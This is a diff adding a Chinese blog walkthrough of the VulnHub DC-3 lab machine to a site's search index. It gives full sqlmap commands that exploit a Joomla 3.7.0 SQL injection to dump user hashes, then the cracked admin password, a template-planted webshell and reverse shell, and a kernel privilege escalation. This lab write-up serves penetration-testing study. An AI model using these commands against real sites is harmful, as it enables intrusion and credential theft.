@@ -4765,4 +4765,384 @@
         <tag>渗透-靶机</tag>
       </tags>
   </entry>
+  <entry>
+    <title>DC-3靶机打靶记录</title>
+    <url>/2023/09/08/DC-3%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="DC-3靶机打靶记录"><a href="#DC-3靶机打靶记录" class="headerlink" title="DC-3靶机打靶记录"></a>DC-3靶机打靶记录</h1><h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>靶机下载地址：<a class="link"   href="https://www.vulnhub.com/entry/dc-32,312/" >https://www.vulnhub.com/entry/dc-32,312/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>下载得到是一个ova文件</p>
+<p>我们这里直接使用kali导入就行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908200000681.png"
+                      alt="image-20230908200000681"
+                ></p>
+<p>设置靶机名字和虚拟机存放位置</p>
+<p>报错解决：</p>
+<p>在我们启动靶机的时候可能会遇到这个报错：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">IDE设备(磁盘/CD-ROM)配置不正确。&quot;ide0:1&quot;上具有一个IDE从设备，</span><br><span class="line">但没有主设备。此配置在虚拟机中无法正常运行。</span><br><span class="line">请使用配置编辑器将磁盘/CD-ROM 从&quot;ide0:1&quot;移到&quot;ide0:0”。</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908200247081.png"
+                      alt="image-20230908200247081"
+                ></p>
+<p>把这里按报错修改为0：0就行</p>
+<p>然后就可以正常启动靶机</p>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>攻击机和靶机是在同一网段，所以我们这里可以使用arp协议来扫描存活主机</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908200530705.png"
+                      alt="image-20230908200530705"
+                ></p>
+<p>可以扫描我们靶机的ip地址</p>
+<p>或者使用nmap命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.113.0/24</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908201529638.png"
+                      alt="image-20230908201529638"
+                ></p>
+<p>可以得到我们靶机的ip地址为192.168.113.147</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>我们已经得到了目标靶机的ip地址，接下来就是要扫描靶机开放了那些端口</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 -O -p 0-65535 192.168.113.147</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908201709732.png"
+                      alt="image-20230908201709732"
+                ></p>
+<p>根据扫描结果可以看到开放了一个80端口</p>
+<h1 id="三、漏洞扫描挖掘与利用"><a href="#三、漏洞扫描挖掘与利用" class="headerlink" title="三、漏洞扫描挖掘与利用"></a>三、漏洞扫描挖掘与利用</h1><p>访问80端口的web服务</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908201925144.png"
+                      alt="image-20230908201925144"
+                ></p>
+<p>访问主页面告诉了我们的目标，拿下服务器root权限</p>
+<p>首页是一个登录页面</p>
+<p>尝试弱口令登录没有成功</p>
+<p>也不存在sql注入</p>
+<p>用dirserach扫描目录文件</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.113.147/ </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202310941.png"
+                      alt="image-20230908202310941"
+                ></p>
+<p>发现扫描到了管理员后台</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202351755.png"
+                      alt="image-20230908202351755"
+                ></p>
+<p>访问后台是一个管理员登录页面</p>
+<p>尝试弱口令字典爆破</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202528547.png"
+                      alt="image-20230908202528547"
+                ></p>
+<p>弱口令爆破失败</p>
+<p>尝试使用sqlmap尝试登录页面是否存在sql注入</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202751453.png"
+                      alt="image-20230908202751453"
+                ></p>
+<p>不存在sql注入</p>
+<p>我们观察这个后台登录页面发现使用的cms是joomla</p>
+<p>但是我们并不知道版本号</p>
+<p>获取版本号可以用joomla的专用扫描器 joomscan扫描</p>
+<p>安装命令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install joomscan</span><br></pre></td></tr></table></figure></div>
+
+<p>使用命令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">joomscan -u ip</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203241480.png"
+                      alt="image-20230908203241480"
+                ></p>
+<p>我们这里可以得到cms的版本号</p>
+<p>使用searchsploit去漏洞库搜索一下看有没有该版本的漏洞</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit joomla 3.7.0</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203525617.png"
+                      alt="image-20230908203525617"
+                ></p>
+<p>可以看到在3.7.0的joomla中存在sql注入漏洞</p>
+<p>把漏洞利用exp复制当前文件夹</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -m 42033.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203717910.png"
+                      alt="image-20230908203717910"
+                ></p>
+<p>exp中给了sqlmap的使用命令</p>
+<p>这里直接使用sqlmap去进行漏洞利用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.113.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203959594.png"
+                      alt="image-20230908203959594"
+                ></p>
+<p>去爆破表</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.113.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -tables</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908204055600.png"
+                      alt="image-20230908204055600"
+                ></p>
+<p>可以看到在表中有一个users表</p>
+<p>尝试爆表中全部数据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.113.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#x27;#__users&#x27; --dump list[fullordering]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908204418801.png"
+                      alt="image-20230908204418801"
+                ></p>
+<p>获取到了账号 <code>admin</code>，密码 <code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p>
+<p>通过网上百度查询知道这个密码是Blowfish加密</p>
+<p>这里使用john进行暴力破解</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908204755292.png"
+                      alt="image-20230908204755292"
+                ></p>
+<p>经过解密我们可以得到密码为snoopy</p>
+<p>所以我们这里可以得到管理员的账号密码</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin：snoopy</span><br></pre></td></tr></table></figure></div>
+
+<p>尝试登录后台</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205056490.png"
+                     
+                ></p>
+<p>成功登录后台管理页面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205218049.png"
+                      alt="image-20230908205218049"
+                ></p>
+<p>在后台中我们可以修改模板页面的代码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205307778.png"
+                      alt="image-20230908205307778"
+                ></p>
+<p>那我们可以尝试在模板页面中写入phpinfo看看是否可用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230908205403689.png"
+                      alt="image-20230908205403689"
+                ></p>
+<p>访问修改的模板页面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205554965.png"
+                      alt="image-20230908205554965"
+                ></p>
+<p>可以看到成功利用了</p>
+<p>那我们这里可以在模板页面中写入反弹shell代码，从而连接上服务器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205652193.png"
+                      alt="image-20230908205652193"
+                ></p>
+<p>或者直接写入一句话木马</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205710976.png"
+                      alt="image-20230908205710976"
+                ></p>
+<p>尝试蚁剑连接</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205735037.png"
+                      alt="image-20230908205735037"
+                ></p>
+<p>反弹shell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205758952.png"
+                      alt="image-20230908205758952"
+                ></p>
+<p>监听端口</p>
+<p>访问我们修改的页面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205841726.png"
+                      alt="image-20230908205841726"
+                ></p>
+<p>反弹shell成功</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205857858.png"
+                      alt="image-20230908205857858"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205913820.png"
+                      alt="image-20230908205913820"
+                ></p>
+<p>可以看到我们当前是普通用户权限</p>
+<p>查看liunx内核版本</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210019246.png"
+                      alt="image-20230908210019246"
+                ></p>
+<p>4.4的内核不能利用脏牛提权</p>
+<p>尝试suid提权</p>
+<p>查看有s权限的命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find -perm -u=s -type f -exec ls -la &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210223367.png"
+                      alt="image-20230908210223367"
+                ></p>
+<p>没有有s权限的命令</p>
+<p>那就只能看看有没有root权限的命令了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210303889.png"
+                      alt="image-20230908210303889"
+                ></p>
+<p>同样的也是没有</p>
+<p>那这种情况下我们只能去通过searchsploit查找相应的liunx版本是否存在提权漏洞</p>
+<p>那我们首先要先获取到系统的版本号和内核版本号</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/issue		//查看系统版本号</span><br><span class="line">uname -a			//查看内核版本号</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210524256.png"
+                      alt="image-20230908210524256"
+                ></p>
+<p>系统为 <code>ubuntu 16.04</code>，内核发行版本为 <code>4.4.0-21</code></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210745836.png"
+                      alt="image-20230908210745836"
+                ></p>
+<p>找到对应内核版本的漏洞</p>
+<p>有三个漏洞可以利用</p>
+<p>这里使用Linux Kernel 4.4.x (Ubuntu 16.04) - ‘double-fdput()’ bpf(BPF_PROG_LOAD) Privilege Escalation这个漏洞来打</p>
+<p>同样的先把exp下载到kali上</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211034760.png"
+                      alt="image-20230908211034760"
+                ></p>
+<p>打开可以看到exp的下载网址</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211053135.png"
+                      alt="image-20230908211053135"
+                ></p>
+<p>我们把exp下载下来，然后通过蚁剑传送到服务器上面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211156826.png"
+                      alt="image-20230908211156826"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211221597.png"
+                      alt="image-20230908211221597"
+                ></p>
+<p>解压exploit压缩包进行利用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211436246.png"
+                      alt="image-20230908211436246"
+                ></p>
+<p>先执行 <code>complie.sh</code>，然后执行 <code>doubleput</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211653792.png"
+                      alt="image-20230908211653792"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211714171.png"
+                      alt="image-20230908211714171"
+                ></p>
+<p>这里显示已经提权成功</p>
+<p>查看我们当前的权限</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211747289.png"
+                      alt="image-20230908211747289"
+                ></p>
+<p>可以看到我们已经提升到了root权限</p>
+<p>下面获取flag就行了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211833124.png"
+                      alt="image-20230908211833124"
+                ></p>
+<h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>这台靶机相对来说比较简单，更多的是学习渗透的流程和工具的使用，在这个靶机中大多数利用的漏洞都是通过searchsploit在漏洞库中进行检索利用的。</p>
+]]></content>
+      <tags>
+        <tag>渗透-靶机-DC系列</tag>
+      </tags>
+  </entry>
 </search>
